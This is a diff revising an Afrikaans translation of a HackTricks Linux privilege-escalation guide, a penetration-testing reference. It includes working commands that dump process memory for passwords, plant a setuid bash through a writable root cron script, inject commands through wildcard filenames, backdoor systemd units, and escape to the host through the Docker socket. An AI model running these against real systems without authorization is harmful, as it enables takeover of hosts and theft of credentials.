@@ -1,22 +1,23 @@
 # Linux Voorregverhoging
 
+{% hint style="success" %}
+Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
+{% endhint %}
 
 ## Stelselinligting
 
-### OS-inligting
+### OS inligting
 
 Laten ons begin om 'n bietjie kennis van die bedryfstelsel wat loop, te verkry.
 ```bash
@@ -26,7 +27,7 @@ cat /etc/os-release 2>/dev/null # universal on modern systems
 ```
 ### Pad
 
-As jy **skryftoestemmings op enige vouer binne die `PATH`-veranderlike het**, kan jy dalk sommige biblioteke of bineêre lêers kap.
+As jy skryfregte het op enige lêer binne die `PATH` veranderlike, kan jy dalk sommige biblioteke of binêre lêers kap.
 ```bash
 echo $PATH
 ```
@@ -38,7 +39,7 @@ Interessante inligting, wagwoorde of API-sleutels in die omgewingsveranderlikes?
 ```
 ### Kernel-uitbuitings
 
-Kontroleer die kernel-weergawe en of daar 'n uitbuiting is wat gebruik kan word om voorregte te eskaleer
+Kontroleer die kernel-weergawe en of daar 'n uitbuiting is wat gebruik kan word om voorregte te verhoog
 ```bash
 cat /proc/version
 uname -a
@@ -51,11 +52,11 @@ Om al die kwesbare kernweergawes van daardie webwerf te onttrek, kan jy die volg
 ```bash
 curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
 ```
-Hulpmiddels wat kan help om te soek na kernel-uitbuite is:
+Hulpmiddels wat kan help om te soek na kernel-uitbuitings is:
 
 [linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
 [linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
-[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (voer UIT in slagoffer, kontroleer slegs uitbuite vir kernel 2.x)
+[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (voer UIT op slagoffer, kontroleer slegs uitbuitings vir kernel 2.x)
 
 **Soek altyd die kernel-weergawe in Google**, dalk is jou kernel-weergawe geskryf in 'n paar kernel-uitbuitings en dan sal jy seker wees dat hierdie uitbuiting geldig is.
 
@@ -113,8 +114,6 @@ echo "Not found AppArmor"
 fi
 ```
 ### Grsecurity
-
-### Grsecurity
 ```bash
 ((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
 ```
@@ -131,6 +130,8 @@ fi
 (sestatus 2>/dev/null || echo "Not found sestatus")
 ```
 ### ASLR
+
+**Adresruimtelayoutrandomisering (ASLR)** is 'n tegniek wat gebruik word om die posisies van geheuekomponente te skuif om aanvalle moeiliker te maak.
 ```bash
 cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 #If 0, not enabled
@@ -158,14 +159,13 @@ Enumerate nuttige bineêre lêers
 ```bash
 which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
 ```
-Ook, kontroleer of **enige kompiler geïnstalleer is**. Dit is nuttig as jy 'n paar kernel-uitbuitings moet gebruik, aangesien dit aanbeveel word om dit te kompileer op die masjien waar jy dit gaan gebruik (of op een soortgelyk).
+Ook, kontroleer of **enige kompiler geïnstalleer is**. Dit is nuttig as jy 'n kernel-uitbuiting wil gebruik, aangesien dit aanbeveel word om dit op die masjien waar jy dit gaan gebruik (of op een soortgelyk) te kompileer.
 ```bash
 (dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
 ```
 ### Kwesbare sagteware geïnstalleer
 
-Kyk na die **weergawe van die geïnstalleerde pakkette en dienste**. Dalk is daar 'n ou Nagios-weergawe (byvoorbeeld) wat uitgebuit kan word om voorregte te eskaleer...\
-Dit word aanbeveel om handmatig die weergawe van die meer verdagte geïnstalleerde sagteware te ondersoek.
+Kyk na die **weergawe van die geïnstalleerde pakkette en dienste**. Dalk is daar 'n ou Nagios-weergawe (byvoorbeeld) wat uitgebuit kan word om voorregte te verhoog... Dit word aanbeveel om handmatig die weergawe van die meer verdagte geïnstalleerde sagteware te kontroleer.
 ```bash
 dpkg -l #Debian
 rpm -qa #Centos
@@ -173,7 +173,7 @@ rpm -qa #Centos
 Indien jy SSH-toegang tot die masjien het, kan jy ook **openVAS** gebruik om te kyk vir verouderde en kwesbare sagteware wat binne die masjien geïnstalleer is.
 
 {% hint style="info" %}
-_Merk op dat hierdie bevele baie inligting sal toon wat meestal nutteloos sal wees, daarom word dit aanbeveel om sekere toepassings soos OpenVAS of soortgelyke te gebruik wat sal nagaan of enige geïnstalleerde sagteware weergawe kwesbaar is vir bekende aanvalle_
+_Merk op dat hierdie bevele baie inligting sal toon wat meestal nutteloos sal wees, daarom word dit aanbeveel om sekere toepassings soos OpenVAS of soortgelyk te gebruik wat sal nagaan of enige geïnstalleerde sagteware weergawe kwesbaar is vir bekende aanvalle_
 {% endhint %}
 
 ## Prosesse
@@ -184,8 +184,8 @@ ps aux
 ps -ef
 top -n 1
 ```
-Maak altyd seker dat daar moontlike [**electron/cef/chromium debuggers** aan die hardloop is, jy kan dit misbruik om voorregte te eskaleer](electron-cef-chromium-debugger-abuse.md). **Linpeas** ontdek dit deur die `--inspect` parameter binne die bevellyn van die proses te ondersoek.  
-Kyk ook na jou voorregte oor die prosesse binêr lêers, miskien kan jy iemand oorskryf.
+Maak altyd seker vir moontlike [**electron/cef/chromium debuggers** wat loop, jy kan dit misbruik om voorregte te eskaleer](electron-cef-chromium-debugger-abuse.md). **Linpeas** ontdek dit deur die `--inspect` parameter binne die bevellyn van die proses te ondersoek.  
+Ook **kontroleer jou voorregte oor die prosesse binêr lêers**, miskien kan jy iemand oorskryf.
 
 ### Proseshantering
 
@@ -193,7 +193,7 @@ Jy kan gereedskap soos [**pspy**](https://github.com/DominicBreuker/pspy) gebrui
 
 ### Proseshue
 
-Sommige dienste van 'n bediener stoor **geloofsbriewe in die geheue in die teks**.  
+Sommige dienste van 'n bediener stoor **geloofsbriewe in die geheue in die oop teks**.  
 Gewoonlik sal jy **root voorregte** benodig om die geheue van prosesse wat aan ander gebruikers behoort te lees, daarom is dit gewoonlik meer nuttig wanneer jy reeds root is en meer geloofsbriewe wil ontdek.  
 Onthou egter dat **as 'n gewone gebruiker jy die geheue van die prosesse wat jy besit kan lees**.
 
@@ -236,7 +236,7 @@ done
 
 #### /proc/$pid/maps & /proc/$pid/mem
 
-Vir 'n gegewe proses-ID, wys **maps hoe geheue binne daardie proses se** virtuele adresruimte afgebeeld is; dit wys ook die **regte van elke afgebeelde streek**. Die **mem** pseudobestand **blootstel die prosesse se geheue self**. Uit die **maps** lêer weet ons watter **geheue streek leesbaar is** en hul verskuiwings. Ons gebruik hierdie inligting om **in die mem lêer te soek en alle leesbare streek te dump na 'n lêer**.
+Vir 'n gegewe proses-ID, wys **maps hoe geheue toegewys is binne daardie proses se** virtuele adresruimte; dit wys ook die **regte van elke toegewysde streek**. Die **mem** pseudobestand **blootstel die proses se geheue self**. Uit die **maps** lêer weet ons watter **geheue streek leesbaar is** en hul verskuiwings. Ons gebruik hierdie inligting om **in die mem lêer te soek en alle leesbare streek te dump na 'n lêer**.
 ```bash
 procdump()
 (
@@ -287,11 +287,11 @@ Press Ctrl-C to end monitoring without terminating the process.
 ```
 ### Gereedskap
 
-Om 'n proses se geheue te dump, kan jy die volgende gebruik:
+Om 'n prosesgeheue te dump, kan jy die volgende gebruik:
 
 * [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
 * [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Jy kan handmatig die root vereistes verwyder en die proses wat deur jou besit, dump
-* Skrip A.5 van [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root word benodig)
+* Skripsie A.5 van [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root word benodig)
 
 ### Geldele uit Prosesgeheue
 
@@ -311,13 +311,13 @@ strings *.dump | grep -i password
 
 Die gereedskap [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sal **duidelike tekskredensiale uit die geheue** en uit sommige **bekende lêers** steel. Dit vereis root-voorregte om behoorlik te werk.
 
-| Funksie                                            | Proseshernaam        |
+| Funksie                                            | Prosesnaam           |
 | -------------------------------------------------- | -------------------- |
-| GDM wagwoord (Kali Desktop, Debian Desktop)        | gdm-password         |
-| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)  | gnome-keyring-daemon |
-| LightDM (Ubuntu Desktop)                           | lightdm              |
-| VSFTPd (Aktiewe FTP Verbindings)                   | vsftpd               |
-| Apache2 (Aktiewe HTTP Basiese Verifisering-sessies)| apache2              |
+| GDM wagwoord (Kali Desktop, Debian Desktop)       | gdm-password         |
+| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
+| LightDM (Ubuntu Desktop)                          | lightdm              |
+| VSFTPd (Aktiewe FTP Verbindings)                  | vsftpd               |
+| Apache2 (Aktiewe HTTP Basiese Verifiseringsessies) | apache2              |
 | OpenSSH (Aktiewe SSH-sessies - Sudo Gebruik)       | sshd:                |
 
 #### Soek Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
@@ -355,9 +355,9 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
 #Wait cron job to be executed
 /tmp/bash -p #The effective uid and gid to be set to the real uid and gid
 ```
-### Cron gebruik 'n skrip met 'n wild card (Wildcard Injection)
+### Cron gebruik 'n skrips met 'n wild card (Wildcard Injection)
 
-As 'n skrip deur root uitgevoer word en 'n "**\***" binne 'n bevel het, kan jy dit uitbuit om onverwagte dinge te doen (soos privilige-escalation). Voorbeeld:
+As 'n skrips deur root uitgevoer word en 'n "**\***" binne 'n bevel het, kan jy dit uitbuit om onverwagte dinge te doen (soos privilige-escalation). Voorbeeld:
 ```bash
 rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
 ```
@@ -377,15 +377,15 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
 #Wait until it is executed
 /tmp/bash -p
 ```
-Indien die skripsie wat deur root uitgevoer word 'n **gids gebruik waar jy volle toegang tot het**, kan dit dalk nuttig wees om daardie gids te verwyder en 'n **symboliese skakelgids na 'n ander een te skep** wat 'n skripsie beheer wat deur jou beheer word.
+Indien die skripsie wat deur root uitgevoer word 'n **gids gebruik waar jy volle toegang tot het**, kan dit dalk nuttig wees om daardie gids te verwyder en 'n **symboliese skakelgids na 'n ander een te skep** wat 'n skrips beheer deur jou dien.
 ```bash
 ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 ```
 ### Gereelde cron-werk
 
-Jy kan die prosesse monitor om te soek na prosesse wat elke 1, 2 of 5 minute uitgevoer word. Miskien kan jy daarvan gebruik maak en voorregte eskaleer.
+Jy kan die prosesse monitor om te soek na prosesse wat elke 1, 2 of 5 minute uitgevoer word. Miskien kan jy hiervan gebruik maak en voorregte eskaleer.
 
-Byvoorbeeld, om **elke 0.1s te monitor vir 1 minuut**, **sorteer volgens minder uitgevoerde opdragte** en verwyder die opdragte wat die meeste uitgevoer is, kan jy doen:
+Byvoorbeeld, om **elke 0.1s tydens 1 minuut te monitor**, **te sorteer volgens minder uitgevoerde opdragte** en die opdragte te verwyder wat die meeste uitgevoer is, kan jy doen:
 ```bash
 for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
 ```
@@ -401,12 +401,12 @@ Dit is moontlik om 'n cronjob te skep **deur 'n karretjie terug te plaas na 'n k
 
 ### Skryfbare _.service_ lêers
 
-Kyk of jy enige `.service` lêer kan skryf, as jy kan, **kan jy dit wysig** sodat dit jou **agterdeur uitvoer wanneer** die diens **begin**, **herlaai** of **gestop** word (miskien moet jy wag totdat die masjien herlaai word).\
+Kyk of jy enige `.service` lêer kan skryf, as jy kan, **kan jy dit wysig** sodat dit jou **agterdeur uitvoer wanneer** die diens **begin**, **herlaai** of **gestop** word (miskien sal jy moet wag totdat die masjien herlaai word).\
 Byvoorbeeld, skep jou agterdeur binne die .service lêer met **`ExecStart=/tmp/script.sh`**
 
 ### Skryfbare diens-binêres
 
-Onthou dat as jy **skryftoestemmings oor binêres wat deur dienste uitgevoer word** het, kan jy hulle verander vir agterdeure sodat wanneer die dienste heruitgevoer word, die agterdeure uitgevoer sal word.
+Onthou dat as jy **skryftoestemmings oor binêres wat deur dienste uitgevoer word** het, kan jy hulle verander vir agterdeure sodat wanneer die dienste heruitgevoer word, sal die agterdeure uitgevoer word.
 
 ### systemd PAD - Relatiewe Paaie
 
@@ -414,7 +414,7 @@ Jy kan die PAD sien wat deur **systemd** gebruik word met:
 ```bash
 systemctl show-environment
 ```
-Indien jy vind dat jy **kan skryf** in enige van die lêers van die pad, kan jy moontlik **bevoorregting eskaleer**. Jy moet soek na **relatiewe paaie wat gebruik word in dienskonfigurasie**-lêers soos:
+Indien jy vind dat jy **kan skryf** in enige van die lêers van die pad, kan jy moontlik **priviliges verhoog**. Jy moet soek na **relatiewe paaie wat gebruik word in dienskonfigurasie**-lêers soos:
 ```bash
 ExecStart=faraday-server
 ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
@@ -426,7 +426,7 @@ Dan, skep 'n **uitvoerbare** met dieselfde naam as die relatiewe pad binêre lê
 
 ## **Tydskakelaars**
 
-**Tydskakelaars** is systemd eenheidslêers waarvan die naam eindig op `**.timer**` wat `**.service**` lêers of gebeure beheer. **Tydskakelaars** kan gebruik word as 'n alternatief vir cron aangesien hulle ingeboude ondersteuning vir kalender tydgebeurtenisse en monotoniese tydgebeurtenisse het en asinkroon uitgevoer kan word.
+**Tydskakelaars** is systemd eenheidslêers waarvan die naam eindig op `**.timer**` wat `**.service**` lêers of gebeurtenisse beheer. **Tydskakelaars** kan gebruik word as 'n alternatief vir cron aangesien hulle ingeboude ondersteuning vir kalender tydgebeurtenisse en monotoniese tydgebeurtenisse het en asinkronies uitgevoer kan word.
 
 Jy kan al die tydskakelaars opsom met:
 ```bash
@@ -434,29 +434,29 @@ systemctl list-timers --all
 ```
 ### Skryfbare timers
 
-As jy 'n tydsaanduig kan wysig, kan jy dit laat uitvoer met sommige bestaandes van systemd.unit (soos 'n `.service` of 'n `.target`)
+As jy 'n tydsaanduig kan wysig, kan jy dit laat uitvoer op bestaande systemd.unit (soos 'n `.service` of 'n `.target`)
 ```bash
 Unit=backdoor.service
 ```
 In die dokumentasie kan jy lees wat die Eenheid is:
 
-> Die eenheid wat geaktiveer moet word wanneer hierdie tydhouer verloop. Die argument is 'n eenheidsnaam, waarvan die agtervoegsel nie ".timer" is nie. Indien nie gespesifiseer nie, is hierdie waarde verstek na 'n diens wat dieselfde naam as die tydhouereenheid het, behalwe vir die agtervoegsel. (Sien hierbo.) Dit word aanbeveel dat die eenheidsnaam wat geaktiveer word en die eenheidsnaam van die tydhouereenheid identies genoem word, behalwe vir die agtervoegsel.
+> Die eenheid wat geaktiveer moet word wanneer hierdie tydhouer verloop. Die argument is 'n eenheidsnaam, waarvan die agtervoegsel nie ".timer" is nie. Indien nie gespesifiseer nie, word hierdie waarde standaard na 'n diens wat dieselfde naam as die tydhouereenheid het, behalwe vir die agtervoegsel. (Sien hierbo.) Dit word aanbeveel dat die eenheidsnaam wat geaktiveer word en die eenheidsnaam van die tydhouereenheid identies genoem word, behalwe vir die agtervoegsel.
 
 Daarom, om hierdie toestemming te misbruik, sal jy nodig hê:
 
-* Vind 'n paar systemd-eenheid (soos 'n `.service`) wat 'n **skryfbare binêre lêer uitvoer**
+* Vind 'n paar systemd-eenheid (soos 'n `.service`) wat 'n **skryfbare binêre lê** uitvoer
 * Vind 'n paar systemd-eenheid wat 'n **relatiewe pad uitvoer** en jy het **skryfregte** oor die **systemd PAD** (om daardie uitvoerbare lêer te verpersoonlik)
 
 **Leer meer oor tydhouers met `man systemd.timer`.**
 
-### **Tydhouer Aktiveer**
+### **Tydhouer aktiveer**
 
-Om 'n tydhouer te aktiveer, benodig jy root-gebruikersregte en moet jy uitvoer:
+Om 'n tydhouer te aktiveer, het jy nodig om root-regte te hê en die volgende uit te voer:
 ```bash
 sudo systemctl enable backu2.timer
 Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
 ```
-Merk op dat die **tydhouer** geaktiveer word deur 'n simbooliese skakel daarna te skep in `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`
+Let op dat die **tydhouer** geaktiveer word deur 'n simbooliese skakel daarna te skep in `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`
 
 ## Sockets
 
@@ -467,10 +467,10 @@ Sokkels kan gekonfigureer word met behulp van `.socket`-lêers.
 **Leer meer oor sokkels met `man systemd.socket`.** Binne hierdie lêer kan verskeie interessante parameters gekonfigureer word:
 
 * `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Hierdie opsies is verskillend, maar 'n opsomming word gebruik om aan te dui **waar dit gaan luister** na die sokkel (die pad van die AF\_UNIX-sokkellêer, die IPv4/6 en/of poortnommer om na te luister, ens.)
-* `Accept`: Neem 'n booleaanse argument. As dit **waar** is, word 'n **diensinstansie geskep vir elke inkomende verbinding** en word slegs die verbindingsokkel daaraan oorgedra. As dit **onwaar** is, word al die luisterende sokkels self aan die beginnende diens eenheid oorgedra, en slegs een diens eenheid word geskep vir al die verbindinge. Hierdie waarde word geïgnoreer vir datagram sokkels en FIFO's waar 'n enkele diens eenheid onvoorwaardelik al die inkomende verkeer hanteer. **Standaard onwaar**. Vir prestasie redes word dit aanbeveel om nuwe duiwels slegs op 'n manier te skryf wat geskik is vir `Accept=no`.
+* `Accept`: Neem 'n booleaanse argument. As dit **waar** is, word 'n **diensinstansie geskep vir elke inkomende verbinding** en word slegs die verbindingsokkel daaraan oorgedra. As dit **onwaar** is, word al die luisterende sokkels self aan die beginnende diens-eenheid oorgedra, en slegs een diens-eenheid word geskep vir al die verbindinge. Hierdie waarde word geïgnoreer vir datagram-sokkels en FIFO's waar 'n enkele diens-eenheid onvoorwaardelik al die inkomende verkeer hanteer. **Standaard onwaar**. Vir prestasie-redes word dit aanbeveel om nuwe duiwels slegs op 'n manier te skryf wat geskik is vir `Accept=no`.
 * `ExecStartPre`, `ExecStartPost`: Neem een of meer opdraglyne, wat uitgevoer word **voor** of **na** die luisterende **sokkels**/FIFO's **geskep** en gebind word, onderskeidelik. Die eerste token van die opdraglyn moet 'n absolute lêernaam wees, gevolg deur argumente vir die proses.
 * `ExecStopPre`, `ExecStopPost`: Addisionele **opdragte** wat uitgevoer word **voor** of **na** die luisterende **sokkels**/FIFO's **gesluit** en verwyder word, onderskeidelik.
-* `Service`: Spesifiseer die **diens** eenheidsnaam **om te aktiveer** met **inkomende verkeer**. Hierdie instelling is slegs toegelaat vir sokkels met Accept=no. Dit gaan standaard na die diens wat dieselfde naam as die sokkel dra (met die agtervoegsel vervang). In die meeste gevalle behoort dit nie nodig te wees om hierdie opsie te gebruik nie.
+* `Service`: Spesifiseer die **diens**-eenheidsnaam **om te aktiveer** met **inkomende verkeer**. Hierdie instelling is slegs toegelaat vir sokkels met Accept=no. Dit word standaard na die diens wat dieselfde naam as die sokkel dra (met die agtervoegsel vervang). In die meeste gevalle behoort dit nie nodig te wees om hierdie opsie te gebruik nie.
 
 ### Skryfbare .socket-lêers
 
@@ -479,7 +479,7 @@ _Merk op dat die stelsel daardie sokkellêer-konfigurasie moet gebruik of die ag
 
 ### Skryfbare sokkels
 
-As jy enige skryfbare sokkel **identifiseer** (_nou praat ons oor Unix-sokkels en nie oor die konfigurasie `.socket`-lêers nie_), dan **kan jy kommunikeer** met daardie sokkel en miskien 'n kwesbaarheid uitbuit.
+As jy enige skryfbare sokkel **identifiseer** (_nou praat ons oor Unix-sokkels en nie oor die konfig `.socket`-lêers nie_), dan **kan jy kommunikeer** met daardie sokkel en miskien 'n kwesbaarheid uitbuit.
 
 ### Enumereer Unix-sokkels
 ```bash
@@ -506,42 +506,42 @@ Merk op dat daar dalk **sokkels is wat luister vir HTTP** versoeke (_Ek praat ni
 ```bash
 curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
 ```
-Indien die sokkie **reageer met 'n HTTP** versoek, kan jy met dit ** kommunikeer ** en miskien ** 'n kwesbaarheid uitbuit **.
+Indien die sokkie **reageer met 'n HTTP** versoek, kan jy met dit **kommunikeer** en dalk **van 'n kwesbaarheid misbruik maak**.
 
 ### Skryfbare Docker Sokkie
 
-Die Docker-sokkie, dikwels gevind by `/var/run/docker.sock`, is 'n kritieke lêer wat beveilig moet word. Standaard is dit skryfbaar deur die `root`-gebruiker en lede van die `docker`-groep. Om skryftoegang tot hierdie sokkie te hê, kan lei tot voorreg-escalasie. Hier is 'n uiteensetting van hoe dit gedoen kan word en alternatiewe metodes as die Docker CLI nie beskikbaar is nie.
+Die Docker sokkie, dikwels gevind by `/var/run/docker.sock`, is 'n kritieke lêer wat beveilig moet word. Standaard is dit skryfbaar deur die `root` gebruiker en lede van die `docker` groep. Om skryftoegang tot hierdie sokkie te hê, kan lei tot voorreg-escalasie. Hier is 'n uiteensetting van hoe dit gedoen kan word en alternatiewe metodes as die Docker CLI nie beskikbaar is nie.
 
 #### **Voorreg-escalasie met Docker CLI**
 
-As jy skryftoegang tot die Docker-sokkie het, kan jy voorregte eskaleer deur die volgende opdragte te gebruik:
+As jy skryftoegang tot die Docker sokkie het, kan jy voorregte opskerp deur die volgende opdragte te gebruik:
 ```bash
 docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
 docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
 ```
-Hierdie bevele stel jou in staat om 'n houer uit te voer met wortelvlak toegang tot die lêersisteem van die gasheer.
+Hierdie bevele stel jou in staat om 'n houer met wortelvlaktoegang tot die gasheer se lêersisteem uit te voer.
 
 #### **Om die Docker API Direk te Gebruik**
 
-In gevalle waar die Docker CLI nie beskikbaar is nie, kan die Docker sokket steeds gemanipuleer word deur die Docker API en `curl` bevele.
+In gevalle waar die Docker CLI nie beskikbaar is nie, kan die Docker-socket steeds gemanipuleer word deur die Docker API en `curl`-bevele te gebruik.
 
-1.  **Lys Docker Beelde:** Haal die lys van beskikbare beelde op.
+1.  **Lys Docker-beelde:** Haal die lys van beskikbare beelde op.
 
 ```bash
 curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
 ```
-2.  **Skep 'n Houer:** Stuur 'n versoek om 'n houer te skep wat die gasheer se stelsel se hoofgids monteer.
+2.  **Skep 'n Houer:** Stuur 'n versoek om 'n houer te skep wat die gasheerstelsel se hoofgids aankoppel.
 
 ```bash
 curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
 ```
 
-Begin die nuutgeskepte houer:
+Begin die nuut geskepte houer:
 
 ```bash
 curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
 ```
-3.  **Koppel aan die Houer:** Gebruik `socat` om 'n verbinding met die houer tot stand te bring, wat beveluitvoering binne-in dit moontlik maak.
+3.  **Koppel aan die Houer:** Gebruik `socat` om 'n verbinding met die houer tot stand te bring, wat die uitvoering van bevele daarin moontlik maak.
 
 ```bash
 socat - UNIX-CONNECT:/var/run/docker.sock
@@ -551,11 +551,11 @@ Connection: Upgrade
 Upgrade: tcp
 ```
 
-Nadat die `socat`-verbinding opgestel is, kan jy bevele direk in die houer uitvoer met wortelvlak toegang tot die gasheer se lêersisteem.
+Nadat die `socat`-verbinding opgestel is, kan jy bevele direk in die houer uitvoer met wortelvlaktoegang tot die gasheer se lêersisteem.
 
 ### Ander
 
-Let daarop dat as jy skryfregte oor die docker sokket het omdat jy **binne die groep `docker`** is, het jy [**meer maniere om voorregte te eskaleer**](interesting-groups-linux-pe/#docker-group). As die [**docker API luister op 'n poort** kan jy dit ook dalk kompromitteer](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
+Let daarop dat as jy skryfregte oor die docker-socket het omdat jy **binne die groep `docker`** is, het jy [**meer maniere om voorregte te eskaleer**](interesting-groups-linux-pe/#docker-group). As die [**docker API na 'n poort luister** kan jy dit ook dalk kompromitteer](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
 
 Kyk na **meer maniere om uit te breek uit docker of dit te misbruik om voorregte te eskaleer** in:
 
@@ -581,13 +581,13 @@ As jy vind dat jy die **`runc`** bevel kan gebruik, lees die volgende bladsy aan
 
 ## **D-Bus**
 
-D-Bus is 'n gesofistikeerde **Inter-Process Communication (IPC) stelsel** wat programme in staat stel om doeltreffend te interaksieer en data te deel. Ontwerp met die moderne Linux-stelsel in gedagte, bied dit 'n robuuste raamwerk vir verskillende vorme van program kommunikasie.
+D-Bus is 'n gesofistikeerde **interproseskommunikasie (IPC)-sisteem** wat programme in staat stel om doeltreffend te interaksieer en data te deel. Ontwerp met die moderne Linux-sisteem in gedagte, bied dit 'n robuuste raamwerk vir verskillende vorme van programkommunikasie.
 
-Die stelsel is veelsydig, ondersteun basiese IPC wat data-uitruil tussen prosesse verbeter, wat herinner aan **verbeterde UNIX-domein-sokkels**. Verder help dit om gebeure of seine uit te saai, wat naadlose integrasie tussen stelselkomponente bevorder. Byvoorbeeld, 'n sein van 'n Bluetooth-daemon oor 'n inkomende oproep kan 'n musiekspeler aanmoedig om te demp, wat die gebruikerservaring verbeter. Daarbenewens ondersteun D-Bus 'n afgeleë objekstelsel, wat diensversoeke en metode-aanroepings tussen programme vereenvoudig, wat prosesse wat tradisioneel kompleks was, stroomlyn.
+Die stelsel is veelsydig en ondersteun basiese IPC wat data-uitruiling tussen prosesse verbeter, wat herinner aan **verbeterde UNIX-domeinsokkels**. Daarbenewens help dit om gebeure of seine uit te saai, wat naadlose integrasie tussen stelselkomponente bevorder. Byvoorbeeld, 'n sein van 'n Bluetooth-daemon oor 'n inkomende oproep kan 'n musiekspeler laat stil word, wat die gebruikerservaring verbeter. Daarbenewens ondersteun D-Bus 'n afgeleë objeksisteem, wat diensversoeke en metode-aanroepings tussen programme vereenvoudig, wat prosesse wat tradisioneel kompleks was, stroomlyn.
 
